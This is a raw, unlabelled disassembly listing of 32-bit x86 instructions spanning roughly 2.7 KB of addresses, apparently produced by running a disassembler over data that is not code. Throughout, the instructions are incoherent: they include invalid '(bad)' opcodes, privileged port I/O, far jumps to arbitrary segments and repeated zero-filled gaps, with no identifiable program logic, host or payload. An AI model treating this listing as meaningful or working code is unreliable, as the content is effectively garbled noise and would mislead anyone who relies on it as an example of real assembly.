  415e30:	arpl   WORD PTR [edx],cx
  415e32:	stos   DWORD PTR es:[edi],eax
  415e33:	jmp    0x8d9db97a
  415e38:	push   ecx
  415e39:	gs (bad) 
  415e3b:	shl    edx,cl
  415e3d:	lods   al,BYTE PTR ds:[esi]
  415e3e:	adc    edi,DWORD PTR [eax-0x44]
  415e41:	add    eax,0x3019cdfd
  415e46:	mov    dl,0x41
  415e48:	sti    
  415e49:	lock add al,0xc1
  415e4c:	mov    cl,0xd0
  415e4e:	cld    
  415e4f:	mov    ch,0xf0
  415e51:	sbb    eax,0x76411ab9
  415e56:	fcomp  QWORD PTR [eax-0x27]
  415e59:	jmp    0x7462fd2e
  415e5e:	add    eax,DWORD PTR [ebx]
  415e60:	std    
  415e61:	lods   eax,DWORD PTR ds:[esi]
  415e62:	adc    eax,0xa650e7ac
  415e67:	xchg   edx,eax
  415e68:	pop    eax
  415e69:	sbb    BYTE PTR [ecx+0x5b5d],dh
	...
  415ed3:	add    BYTE PTR [eax],al
  415ed5:	add    dh,ch
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax-0x52]
  415ee3:	test   eax,0xec52f8fe
  415ee8:	add    BYTE PTR [eax],al
  415eea:	inc    DWORD PTR [eax]
  415eec:	add    BYTE PTR [eax],al
  415eee:	pop    esi
  415eef:	mov    eax,0x63a9b111
  415ef4:	xchg   edx,eax
  415ef5:	aad    0x9d
  415ef7:	cmp    bl,BYTE PTR [ebp-0xd078a29]
  415efd:	sub    esp,DWORD PTR [edi-0x6f]
  415f00:	dec    edx
  415f01:	(bad)  [edi-0x1e1abd37]
  415f07:	popa   
  415f08:	iret   
  415f09:	dec    ebx
  415f0a:	retf   0x1e50
  415f0d:	mov    DWORD PTR [edi],edx
  415f0f:	jmp    0x415f0d
  415f11:	push   edx
  415f12:	and    DWORD PTR [esi+0x37],esp
  415f15:	(bad)  
  415f16:	mov    ds:0x35d76c7c,eax
  415f1b:	inc    esp
  415f1c:	dec    edi
  415f1d:	(bad)  
  415f1e:	int    0xd6
  415f20:	cld    
  415f21:	push   edi
  415f22:	jno    0x415f4e
  415f24:	ret    
  415f25:	imul   ebx,DWORD PTR [eax],0x41
  415f28:	add    ebx,esi
  415f2a:	pop    es
  415f2b:	and    ecx,DWORD PTR [ecx+0x3edd5a2d]
  415f31:	pop    ebx
  415f32:	jae    0x415ec6
  415f34:	or     BYTE PTR [eax-0x22],al
  415f37:	mov    esp,0xa76e971
  415f3c:	and    DWORD PTR [esi+0xe099103],esp
  415f42:	mov    ebx,0x8ed823ea
  415f47:	unpckhps xmm7,XMMWORD PTR [ebp-0x1294721a]
  415f4e:	push   bp
  415f50:	cs pusha 
  415f52:	div    BYTE PTR [ebp-0x44b36bd7]
  415f58:	jbe    0x415fa7
  415f5a:	mov    edi,0x7329f35a
  415f5f:	push   cs
  415f60:	les    ecx,FWORD PTR [esi-0x603f8c81]
  415f66:	nop
  415f67:	mov    ?,WORD PTR [edi+0x1e90387c]
  415f6d:	fnsave [eax+eax*8-0x52]
  415f71:	lahf   
  415f72:	and    al,0x1a
  415f74:	jmp    0x10ef:0x565186eb
  415f7b:	xor    al,0x3a
  415f7d:	ret    
  415f7e:	mov    bl,0x3a
  415f80:	adc    DWORD PTR [eax],esi
  415f82:	in     al,dx
  415f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f84:	fild   WORD PTR ds:[ebp+ecx*4+0x52688ae4]
  415f8c:	aam    0x8e
  415f8e:	push   DWORD PTR [esi+0x53]
  415f91:	lock ins BYTE PTR es:[edi],dx
  415f93:	jbe    0x415f5a
  415f95:	test   esi,ebp
  415f97:	jecxz  0x415fa0
  415f99:	add    dh,BYTE PTR [eax+0x22]
  415f9c:	inc    esp
  415f9d:	pop    ebx
  415f9e:	lds    ecx,FWORD PTR [esi+edi*8-0x4eb14610]
  415fa5:	mov    esp,0x9c96f70
  415faa:	into   
  415fab:	pop    edi
  415fac:	dec    ebp
  415fad:	lock fwait
  415faf:	sbb    eax,0x1d8bfefb
  415fb4:	dec    esi
  415fb5:	js     0x415fe6
  415fb7:	lods   eax,DWORD PTR ds:[esi]
  415fb8:	js     0x415f8a
  415fba:	and    ch,BYTE PTR [ebp+0x1a5da730]
  415fc0:	cld    
  415fc1:	int3   
  415fc2:	adc    eax,0xfffffff1
  415fc5:	retf   
  415fc6:	out    0xca,eax
  415fc8:	xor    cl,bh
  415fca:	and    eax,0x1c8e42e
  415fcf:	jns    0x415fc4
  415fd1:	das    
  415fd2:	adc    BYTE PTR [ebx],0x0
  415fd5:	sub    ah,0xf6
  415fd8:	or     eax,DWORD PTR [ebx-0x2e809ff5]
  415fde:	out    dx,ax
  415fe0:	inc    edx
  415fe1:	sub    edx,DWORD PTR [ebp+0x1e]
  415fe4:	jb     0x415fce
  415fe6:	jae    0x415faa
  415fe8:	and    ecx,esp
  415fea:	pop    edi
  415feb:	hlt    
  415fec:	add    BYTE PTR ss:[eax],al
	...
  416053:	add    BYTE PTR [eax],al
  416055:	add    BYTE PTR [edi],dl
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	shl    BYTE PTR [eax],1
  416064:	cmp    al,0x3a
  416066:	push   ecx
  416067:	in     eax,dx
  416068:	add    BYTE PTR [eax],al
  41606a:	inc    DWORD PTR [eax]
  41606c:	add    BYTE PTR [eax],al
  41606e:	pushf  
  41606f:	test   al,0xb
  416071:	xor    al,0x9d
  416073:	dec    eax
  416074:	popa   
  416075:	pop    ecx
  416076:	addr16 inc esp
  416078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416079:	leave  
  41607a:	in     eax,dx
  41607b:	xbegin 0x8dc47984
  416081:	ficomp WORD PTR [edi]
  416083:	loope  0x4160d5
  416085:	bound  esi,QWORD PTR ds:0x80284184
  41608b:	cs sub ah,bh
  41608e:	push   ebx
  41608f:	int3   
  416090:	stos   BYTE PTR es:[edi],al
  416091:	sbb    ebp,DWORD PTR [ecx+0x6dfa21e3]
  416097:	in     al,0xad
  416099:	(bad)  
  41609a:	cmp    ebp,ebp
  41609c:	test   eax,0xd3864833
  4160a1:	out    0xd7,eax
  4160a3:	ret    
  4160a4:	icebp  
  4160a5:	imul   edi,DWORD PTR [ecx],0x2a
  4160a8:	fimul  DWORD PTR [ebp+0x1a]
  4160ab:	dec    edx
  4160ac:	enter  0xf082,0xb3
  4160b0:	rol    BYTE PTR es:[edi],cl
  4160b3:	loopne 0x416067
  4160b5:	inc    esi
  4160b6:	rcr    ebp,cl
  4160b8:	inc    ecx
  4160b9:	lds    eax,FWORD PTR [ebx-0x10582516]
  4160bf:	sub    eax,0xb37f7716
  4160c4:	push   cs
  4160c5:	push   esi
  4160c6:	rcr    ah,1
  4160c8:	pop    edi
  4160c9:	stos   DWORD PTR es:[edi],eax
  4160ca:	xor    esp,DWORD PTR [ebp-0x32d6dc13]
  4160d0:	shr    DWORD PTR [ebx-0x73e2e6bc],0xbe
  4160d7:	inc    eax
  4160d8:	or     bh,BYTE PTR [ebx+ebp*8+0x73]
  4160dc:	das    
  4160dd:	mov    ch,0x9
  4160df:	test   cl,al
  4160e1:	aaa    
  4160e2:	xor    ah,BYTE PTR [ebx-0x53a0ac16]
  4160e8:	imul   edi,DWORD PTR [esi],0xf237937a
  4160ee:	cli    
  4160ef:	aad    0x4b
  4160f1:	out    0x1c,al
  4160f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160f4:	popf   
  4160f5:	ficom  DWORD PTR ds:0x76e7ac35
  4160fb:	in     eax,dx
  4160fc:	imul   edx,eax,0xcfad4e8d
  416102:	(bad)  
  416103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416104:	xchg   edi,eax
  416105:	jg     0x41610a
  416107:	pop    ds
  416108:	mov    eax,DWORD PTR [eax+0x1f39e66e]
  41610e:	mov    DWORD PTR cs:[ebx+0x2d],ebp
  416112:	xchg   ebx,eax
  416113:	cmp    eax,0xcc2c69d3
  416118:	push   ss
  416119:	sbb    BYTE PTR [ebx-0x5291dfc],ch
  41611f:	push   0xffffffd9
  416121:	aad    0xf2
  416123:	cmovb  eax,DWORD PTR ds:0x8ae6ca95
  41612a:	imul   ebp,DWORD PTR [ebp-0x4644ae54],0x13
  416131:	lods   al,BYTE PTR ds:[esi]
  416132:	inc    edi
  416133:	aas    
  416134:	push   esi
  416135:	xlat   BYTE PTR ds:[ebx]
  416136:	pop    esi
  416137:	setbe  BYTE PTR [edi+ecx*2-0x26]
  41613c:	stc    
  41613d:	lods   al,BYTE PTR ds:[esi]
  41613e:	cs ret 
  416140:	dec    edi
  416141:	inc    esi
  416142:	mov    ds:0x8f05d87d,al
  416147:	shr    BYTE PTR [edi+0x1c],0x59
  41614b:	out    dx,eax
  41614c:	fldcw  WORD PTR [edi+0x52]
  41614f:	pushf  
  416150:	das    
  416151:	cwde   
  416152:	std    
  416153:	push   esi
  416154:	push   cs
  416155:	inc    ebx
  416156:	sahf   
  416157:	int    0x4e
  416159:	push   0x5b
  41615b:	jl     0x4161a0
  41615d:	xchg   ecx,eax
  41615e:	add    BYTE PTR [ecx],ah
  416160:	mov    al,0xe8
  416162:	and    bh,BYTE PTR [ebx+0x49bfbe42]
  416168:	mov    cl,0xc3
  41616a:	and    esp,DWORD PTR [ebp+0x83]
	...
  4161d4:	add    BYTE PTR [eax],al
  4161d6:	and    cl,ch
  4161d8:	cmp    ebx,esi
  4161da:	sti    
  4161db:	fsubrp st(5),st
  4161dd:	inc    esi
  4161df:	push   edx
  4161e0:	sub    eax,0x1a26bdf3
  4161e5:	xor    BYTE PTR [eax-0x12],dl
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	inc    DWORD PTR [eax]
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	rcr    DWORD PTR [ebp+0x654c088],cl
  4161f4:	cmp    al,al
  4161f6:	dec    edi
  4161f7:	or     cl,0x16
  4161fa:	adc    eax,0x1b6cb26d
  4161ff:	dec    edi
  416200:	sbb    DWORD PTR ds:0xcbf9c3b6,esi
  416206:	push   es
  416207:	ror    DWORD PTR [edi+esi*4],0xbb
  41620b:	jne    0x4161d8
  41620d:	out    0xcc,al
  41620f:	sbb    edi,DWORD PTR ss:[esi+edx*1+0x75]
  416214:	call   0xc538:0xa09fcdf3
  41621b:	aad    0x41
  41621d:	xchg   edi,eax
  41621e:	pusha  
  41621f:	test   al,0xe8
  416221:	daa    
  416222:	jne    0x4161e9
  416224:	xchg   edi,eax
  416225:	or     BYTE PTR [ebp+0x50fec8f5],bh
  41622b:	stos   BYTE PTR es:[edi],al
  41622c:	cmp    BYTE PTR [edx+ecx*2-0x6def25],al
  416233:	sub    BYTE PTR ds:0x786ad792,dh
  416239:	jb     0x4161e3
  41623b:	mov    ah,0x62
  41623d:	xchg   esp,eax
  41623e:	and    ebp,DWORD PTR [edx]
  416240:	imul   edx,DWORD PTR [eax+0x433a9d1c],0xffffffe8
  416247:	test   esi,edx
  416249:	inc    eax
  41624a:	push   0x4d
  41624c:	or     eax,0x8909faae
  416251:	iret   
  416252:	popf   
  416253:	js     0x416213
  416255:	pusha  
  416256:	mov    ah,0x1d
  416258:	(bad)  
  416259:	mov    ds:0xe8a0e29b,al
  41625e:	jno    0x416295
  416260:	in     al,dx
  416261:	stc    
  416262:	inc    ebp
  416263:	xor    al,0x98
  416265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416266:	or     cl,BYTE PTR [edi+0x25]
  416269:	sbb    DWORD PTR [esi+0x5d],edx
  41626c:	push   ecx
  41626d:	jbe    0x416257
  41626f:	jmp    0x1fd0:0x42fe883c
  416276:	jne    0x416213
  416278:	sub    BYTE PTR ds:0x6e0c9003,al
  41627e:	jb     0x4162a3
  416280:	fwait
  416281:	add    ebp,edi
  416283:	enter  0xc6f7,0x99
  416287:	inc    edx
  416288:	mov    BYTE PTR [ebx+0x74],bh
  41628b:	mov    al,ds:0x49c4bf2c
  416290:	dec    ebp
  416291:	lahf   
  416292:	dec    eax
  416293:	mov    edi,0x8660893b
  416298:	xlat   BYTE PTR ds:[ebx]
  416299:	pushf  
  41629a:	sbb    BYTE PTR [edi+0x2d279a32],0x3f
  4162a1:	stos   BYTE PTR es:[edi],al
  4162a2:	iret   
  4162a3:	and    DWORD PTR [ebp-0x73da4528],0xffffffc2
  4162aa:	popf   
  4162ab:	mov    edx,0xb5688fc2
  4162b0:	out    dx,al
  4162b1:	retf   
  4162b2:	xor    eax,0x3dc81cc5
  4162b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b8:	(bad)  
  4162b9:	sti    
  4162ba:	cmc    
  4162bb:	cmp    BYTE PTR [bp+si+0x6b5c],dl
  4162c0:	mov    esp,0xa43c92b0
  4162c5:	clc    
  4162c6:	pop    ebp
  4162c7:	dec    esi
  4162c8:	cwde   
  4162c9:	enter  0x5906,0x22
  4162cd:	push   edx
  4162ce:	add    BYTE PTR [ecx+edi*8],ch
  4162d1:	and    eax,0xb6e7142d
  4162d6:	aad    0xed
  4162d8:	and    al,BYTE PTR [esi-0x7c8a6985]
  4162de:	xlat   BYTE PTR ds:[ebx]
  4162df:	and    BYTE PTR [ebp+0x60],cl
  4162e2:	sub    DWORD PTR [ebx+0x36f1fc45],ebp
  4162e8:	fdivr  DWORD PTR [esp+eax*2]
  4162eb:	(bad)  
  4162ec:	xlat   BYTE PTR ds:[ebx]
	...
  416355:	add    BYTE PTR [ebx],ah
  416357:	outs   dx,BYTE PTR ds:[esi]
  416358:	xor    ah,BYTE PTR ds:0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x4fbf:0x6f29c6ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	inc    DWORD PTR [eax]
  41636c:	add    BYTE PTR [eax],al
  41636e:	jns    0x416369
  416370:	mov    eax,ds:0xfb6f0f5
  416375:	or     esp,edi
  416377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416378:	push   es
  416379:	int    0x14
  41637b:	mov    ds:0x95aabab1,eax
  416380:	bound  esp,QWORD PTR [edx]
  416382:	sbb    dh,BYTE PTR [edi]
  416384:	pop    es
  416385:	dec    ebx
  416386:	dec    esp
  416387:	dec    esi
  416388:	jnp    0x4163a5
  41638a:	inc    ebx
  41638b:	test   esp,ecx
  41638d:	dec    esi
  41638e:	and    DWORD PTR [esp+edx*2-0x73],ebx
  416392:	pop    edi
  416393:	mov    ecx,0x90d1c9f1
  416398:	outs   dx,DWORD PTR ds:[esi]
  416399:	sbb    dh,dl
  41639b:	push   edi
  41639c:	jo     0x9eae4f5d
  4163a2:	test   ah,ch
  4163a4:	ja     0x41632a
  4163a6:	sub    cl,BYTE PTR [ebp+0x4b]
  4163a9:	ss mov bh,0xb8
  4163ac:	xchg   ebx,eax
  4163ad:	mov    bl,0x94
  4163af:	ret    0xef0d
  4163b2:	mov    DWORD PTR [esi+0x40e68c69],eax
  4163b8:	cld    
  4163b9:	jmp    0x4163af
  4163bb:	jle    0x41642c
  4163bd:	in     eax,0xd1
  4163bf:	sub    al,0x52
  4163c1:	(bad)  
  4163c2:	lea    eax,[edx-0x51]
  4163c5:	gs jmp 0xa4548991
  4163cb:	lahf   
  4163cc:	xor    bh,BYTE PTR [esi-0x61248516]
  4163d2:	push   0x5
  4163d4:	pop    edi
  4163d5:	fsubr  QWORD PTR [esi+0x32efbcf1]
  4163db:	pusha  
  4163dc:	sbb    eax,0xc910ed46
  4163e1:	cmc    
  4163e2:	and    edx,DWORD PTR [ecx+0x1d4ba8a6]
  4163e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163e9:	loope  0x416450
  4163eb:	jecxz  0x416391
  4163ed:	fsub   QWORD PTR [edi-0xe852753]
  4163f3:	je     0x416386
  4163f5:	jno    0x41642e
  4163f7:	rcr    BYTE PTR [ebx+edx*1],1
  4163fa:	mov    edx,0x597c4c7f
  4163ff:	adc    BYTE PTR [ebp+0x746c369e],0xd1
  416406:	xor    ebp,DWORD PTR ds:0x7edc12b7
  41640c:	stc    
  41640d:	enter  0xf654,0x20
  416411:	cbw    
  416413:	adc    eax,0xfc4065f2
  416418:	icebp  
  416419:	dec    eax
  41641a:	in     eax,0xc0
  41641c:	push   ds
  41641d:	rcr    ebp,0x6c
  416420:	add    eax,DWORD PTR [edx-0x30]
  416423:	jmp    0x4eec23e2
  416428:	ds and al,0xb1
  41642b:	not    BYTE PTR [ebx+0x1dab6bc1]
  416431:	adc    esp,ecx
  416433:	sbb    eax,0x6f66920a
  416438:	in     al,dx
  416439:	xor    DWORD PTR [edi],edx
  41643b:	inc    edi
  41643c:	nop
  41643d:	push   es
  41643e:	jnp    0x416465
  416440:	sub    esi,DWORD PTR [edi-0x23]
  416443:	pusha  
  416444:	cmp    esi,DWORD PTR [esi]
  416446:	xor    al,0x73
  416448:	pop    edi
  416449:	mov    eax,ds:0x55193f7f
  41644e:	repnz scas al,BYTE PTR es:[edi]
  416450:	pusha  
  416451:	inc    esp
  416452:	lea    eax,[esi+0x66f2a82f]
  416458:	jmp    0x1f01:0xfbd8fb09
  41645f:	mov    ds:0x14244f18,eax
  416464:	push   ecx
  416465:	xchg   BYTE PTR [esi-0x5d6bbf25],dl
  41646b:	ret    
  41646c:	add    BYTE PTR [bx+si],al
	...
  4164d3:	add    BYTE PTR [eax],al
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	inc    edx
  4164e3:	mov    dl,BYTE PTR [eax]
  4164e5:	add    BYTE PTR [esi-0x10],cl
  4164e8:	add    BYTE PTR [eax],al
  4164ea:	inc    DWORD PTR [eax]
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	sar    DWORD PTR [edx-0x3e],1
  4164f1:	pop    eax
  4164f2:	adc    DWORD PTR [eax],0x4a
  4164f5:	lahf   
  4164f6:	jb     0x416577
  4164f8:	add    DWORD PTR [eax+0x3f],esi
  4164fb:	fnstsw WORD PTR [ebp+0x7b]
  4164fe:	pushf  
  4164ff:	ret    0x523a
  416502:	mov    eax,ds:0x5a53cd7a
  416507:	shr    BYTE PTR [ecx+0x7903aa1a],1
  41650d:	cmc    
  41650e:	aad    0x3e
  416510:	repnz sbb al,0xd
  416513:	aam    0x1e
  416515:	aas    
  416516:	inc    eax
  416517:	adc    esp,DWORD PTR [edi]
  416519:	pop    ss
  41651a:	adc    BYTE PTR [ebx+0x41e3e640],bl
  416520:	jp     0x4164c4
  416522:	dec    ecx
  416523:	adc    eax,0x45dba3a8
  416528:	push   es
  416529:	fmul   QWORD PTR [ecx]
  41652b:	add    BYTE PTR [edx-0x4128b71f],al
  416531:	stos   BYTE PTR es:[edi],al
  416532:	mov    BYTE PTR [eax+0x3c],al
  416535:	sar    DWORD PTR [edx-0x59],1
  416538:	mov    ecx,0xb3704e50
  41653d:	push   ds
  41653e:	or     eax,0x22be634f
  416543:	mov    WORD PTR [ebx],ss
  416545:	scas   eax,DWORD PTR es:[edi]
  416546:	or     al,0x85
  416548:	data16 das 
  41654a:	or     dl,bh
  41654c:	xchg   BYTE PTR [edi+0x3f],ch
  41654f:	sti    
  416550:	mov    ah,BYTE PTR [esi]
  416552:	sti    
  416553:	pop    edx
  416554:	cdq    
  416555:	jmp    0x416577
  416557:	std    
  416558:	mov    ah,0xd8
  41655a:	stos   BYTE PTR es:[edi],al
  41655b:	xchg   DWORD PTR [ebx-0x5097df16],edx
  416561:	inc    edi
  416562:	repz out dx,al
  416564:	aas    
  416565:	(bad)  
  416566:	push   ss
  416567:	mov    ch,0x3e
  416569:	imul   ebp,DWORD PTR [esi+0x7d],0xffffffd9
  41656d:	stos   BYTE PTR es:[edi],al
  41656e:	xchg   DWORD PTR [edx],eax
  416570:	rol    ecx,1
  416572:	xlat   BYTE PTR ds:[ebx]
  416573:	add    eax,0xedaa7c3b
  416578:	xlat   BYTE PTR ds:[ebx]
  416579:	xchg   esi,eax
  41657a:	push   0x10b3cbe2
  41657f:	mov    ecx,0x6e1f3917
  416584:	mov    esp,DWORD PTR [edi+0x4ae690fd]
  41658a:	xor    eax,0x1aa369a4
  41658f:	sbb    BYTE PTR [ecx+0x71b5c3cd],bl
  416595:	test   al,0xfe
  416597:	xchg   edi,eax
  416598:	inc    esi
  416599:	lea    edx,[eax-0x7ef910a]
  41659f:	sub    DWORD PTR [eax],esp
  4165a1:	sbb    BYTE PTR [eax-0xc],ch
  4165a4:	or     esi,DWORD PTR [ecx-0x16]
  4165a7:	dec    esi
  4165a8:	or     al,0x3d
  4165aa:	mov    cl,0x6
  4165ac:	ja     0x416609
  4165ae:	ja     0x4165d4
  4165b0:	movaps XMMWORD PTR [esi-0x507d3bfa],xmm1
  4165b7:	pop    esi
  4165b8:	cmp    eax,0xe325d87b
  4165bd:	add    DWORD PTR [ecx+edx*2],eax
  4165c0:	test   DWORD PTR [esi+0x633f2bb1],ebp
  4165c6:	ret    0x57ac
  4165c9:	cmp    eax,0xcd2e7bf6
  4165ce:	mov    eax,0x7f055f0b
  4165d3:	jge    0x416651
  4165d5:	dec    esi
  4165d6:	push   0x694a9f67
  4165db:	jle    0x416647
  4165dd:	popf   
  4165de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165df:	test   DWORD PTR [edx],ebp
  4165e1:	aas    
  4165e2:	les    esi,FWORD PTR [ebx+edi*8+0x78]
  4165e6:	(bad)  
  4165e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165e8:	out    0x5b,al
  4165ea:	(bad)  
  4165eb:	loop   0x41663e
	...
  416655:	add    BYTE PTR ds:0xfff32bd8,ah
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi-0x9b04354]
  416663:	adc    ebx,DWORD PTR [ecx+eiz*8+0x4d]
  416667:	icebp  
  416668:	add    BYTE PTR [eax],al
  41666a:	inc    DWORD PTR [eax]
  41666c:	add    BYTE PTR [eax],al
  41666e:	retf   0xedb4
  416671:	pusha  
  416672:	lods   al,BYTE PTR ds:[esi]
  416673:	mov    edx,0x4c7f23ea
  416678:	int3   
  416679:	xor    al,0xde
  41667b:	lods   al,BYTE PTR ds:[esi]
  41667c:	lods   al,BYTE PTR ds:[esi]
  41667d:	jne    0x41666e
  41667f:	mov    al,ds:0xe72ff19e
  416684:	and    ecx,DWORD PTR [ecx-0x3010104]
  41668a:	mov    bl,0x11
  41668c:	stos   BYTE PTR es:[edi],al
  41668d:	mov    WORD PTR gs:[eax],es
  416690:	lock and edx,esi
  416693:	retf   
  416694:	jb     0x41662a
  416696:	out    0x2c,eax
  416698:	xchg   ebx,eax
  416699:	mov    bl,0xe
  41669b:	or     DWORD PTR [ecx+0x6fe83f09],esi
  4166a1:	jecxz  0x416691
  4166a3:	inc    ebp
  4166a4:	das    
  4166a5:	sub    DWORD PTR es:[di-0x2865],edx
  4166ab:	mov    eax,ds:0xf151a363
  4166b0:	push   esi
  4166b1:	and    DWORD PTR [ebx+0x3e4fd27e],esp
  4166b7:	das    
  4166b8:	sub    DWORD PTR [ebp+0x71],eax
  4166bb:	mov    bl,BYTE PTR ds:0xfe251d52
  4166c1:	xchg   ebx,eax
  4166c2:	sahf   
  4166c3:	ret    
  4166c4:	sti    
  4166c5:	jmp    0x41673d
  4166c7:	lods   al,BYTE PTR ds:[esi]
  4166c8:	ss retf 
  4166ca:	mov    edi,0xc9f9bb89
  4166cf:	dec    edi
  4166d0:	push   ecx
  4166d1:	mov    esi,0xe34f6cea
  4166d6:	int    0x2f
  4166d8:	out    dx,eax
  4166d9:	gs inc edi
  4166db:	adc    DWORD PTR [eax-0x6b],0xc1eeb0d8
  4166e2:	loope  0x41671a
  4166e4:	cli    
  4166e5:	aad    0x80
  4166e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e8:	jecxz  0x416674
  4166ea:	push   0x21
  4166ec:	lods   eax,DWORD PTR ds:[esi]
  4166ed:	pop    esi
  4166ee:	xchg   BYTE PTR [ecx-0x5d5a2c67],dl
  4166f4:	lods   eax,DWORD PTR ds:[esi]
  4166f5:	in     eax,0x1a
  4166f7:	int3   
  4166f8:	(bad)  
  4166f9:	jle    0x416750
  4166fb:	hlt    
  4166fc:	mov    cl,0x11
  4166fe:	xchg   BYTE PTR [edx],al
  416700:	cmp    al,BYTE PTR [esi+0x296a9f95]
  416706:	mov    ebp,0x709f7a51
  41670b:	or     esi,DWORD PTR [eax+0x7]
  41670e:	stc    
  41670f:	fldcw  WORD PTR [ebx*8+0x2c6fcd0e]
  416716:	mov    ebx,0xaecd9a38
  41671b:	jmp    0x41671b
  41671d:	xlat   BYTE PTR ds:[ebx]
  41671e:	mov    bl,BYTE PTR [esp+ecx*8+0x22fa445f]
  416725:	scas   al,BYTE PTR es:[edi]
  416726:	jns    0x4166d5
  416728:	aad    0x9c
  41672a:	daa    
  41672b:	or     ch,BYTE PTR [ebx+0x2652a2b]
  416731:	mov    ebp,ecx
  416733:	and    dl,BYTE PTR [ebx+0x35]
  416736:	jnp    0x41679e
  416738:	inc    ecx
  416739:	sbb    al,0x89
  41673b:	jmp    0x416743
  41673d:	cmp    al,0x29
  41673f:	mov    al,ds:0x953dac81
  416744:	xchg   edi,eax
  416745:	push   esp
  416746:	in     al,0x55
  416748:	ret    
  416749:	inc    edx
  41674a:	cwde   
  41674b:	ret    
  41674c:	xchg   ebx,eax
  41674d:	fadd   st,st(3)
  41674f:	push   cs
  416750:	popa   
  416751:	mov    eax,0x485ceedb
  416756:	jmp    0x6fd9:0xfb657c5a
  41675d:	ror    dl,1
  41675f:	rcl    BYTE PTR [esi-0x4c],0x1a
  416763:	(bad)  
  416764:	push   ds
  416765:	cdq    
  416766:	sar    BYTE PTR [eax],cl
  416768:	push   cs
  416769:	adc    DWORD PTR [ebx+0x85a9],ebp
	...
  4167d3:	add    BYTE PTR [eax],al
  4167d5:	add    ah,al
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	sahf   
  4167e3:	test   DWORD PTR [ecx],esi
  4167e5:	loope  0x416833
  4167e7:	repnz add BYTE PTR [eax],al
  4167ea:	inc    DWORD PTR [eax]
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	pushf  
  4167ef:	pop    edi
  4167f0:	(bad)  
  4167f1:	cmp    DWORD PTR [esi],ebp
  4167f3:	leave  
  4167f4:	cmp    al,0x15
  4167f6:	and    ah,al
  4167f8:	sbb    esp,ebp
  4167fa:	imul   edx,DWORD PTR [ebx+ebp*1-0x1c9a1feb],0x35
  416802:	aas    
  416803:	stos   DWORD PTR es:[edi],eax
  416804:	xchg   ebp,eax
  416805:	sub    ebx,DWORD PTR [edx+ebx*2+0x200e5686]
  41680c:	and    ecx,DWORD PTR [edi+0x68508e97]
  416812:	loope  0x4167e8
  416814:	in     al,dx
  416815:	push   0xd5b932b1
  41681a:	lds    edx,FWORD PTR [esp+ecx*8+0x4e]
  41681e:	clc    
  41681f:	fiadd  WORD PTR [esi+eiz*8-0x36]
  416823:	mov    esp,0xccf89900
  416828:	ret    
  416829:	inc    ebp
  41682a:	fs retf 
  41682c:	inc    edx
  41682d:	arpl   WORD PTR [esp+esi*8],si
  416830:	call   0x1956aeca
  416835:	pop    esp
  416836:	fwait
  416837:	cmc    
  416838:	aam    0xf4
  41683a:	adc    ch,BYTE PTR [ecx]
  41683c:	test   BYTE PTR [eax-0x27addbc2],dl
  416842:	push   ss
  416843:	push   ebp
  416844:	sbb    eax,0x3884ed61
  416849:	aad    0xbc
  41684b:	cmp    al,0xbf
  41684d:	cmp    al,0x69
  41684f:	mov    edx,0x79fe8a3e
  416854:	(bad)  
  416855:	(bad)  
  416856:	jge    0x4168c4
  416858:	cmc    
  416859:	(bad)  
  41685a:	fiadd  DWORD PTR [ecx-0x47835557]
  416860:	push   0x29b63060
  416865:	jle    0x41689d
  416867:	rep stos BYTE PTR es:[edi],al
  416869:	jl     0x41683e
  41686b:	dec    ebx
  41686c:	fnstcw WORD PTR [edx+ebp*8-0x126e10b2]
  416873:	xchg   edx,eax
  416874:	popa   
  416875:	pop    esp
  416876:	in     al,dx
  416877:	outs   dx,DWORD PTR ds:[esi]
  416878:	test   DWORD PTR [ebp-0x3],0x1ad619c1
  41687f:	out    0x7d,eax
  416881:	push   es
  416882:	pop    edx
  416883:	in     eax,dx
  416884:	cmp    dh,BYTE PTR [ebx]
  416886:	or     ebp,0x2063a466
  41688c:	les    ebp,FWORD PTR [ecx]
  41688e:	jmp    0x416829
  416890:	in     eax,0xa2
  416892:	das    
  416893:	not    DWORD PTR [ebx]
  416895:	in     eax,dx
  416896:	sub    al,0x59
  416898:	pop    ebp
  416899:	loopne 0x4168b0
  41689b:	ins    BYTE PTR es:[edi],dx
  41689c:	and    dh,ah
  41689e:	enter  0xd0db,0x71
  4168a2:	pushf  
  4168a3:	mov    ds:0x2ffaae69,eax
  4168a8:	xchg   al,ch
  4168aa:	mov    ebp,0x2645fb50
  4168b0:	dec    ebx
  4168b1:	fistp  WORD PTR [ebp-0x5]
  4168b4:	stos   BYTE PTR es:[edi],al
  4168b5:	sub    dh,BYTE PTR [ecx+0x7d0f183]
  4168bb:	bound  edi,QWORD PTR [esi-0x687130f8]
  4168c1:	dec    ebx
  4168c2:	fisttp WORD PTR [eax]
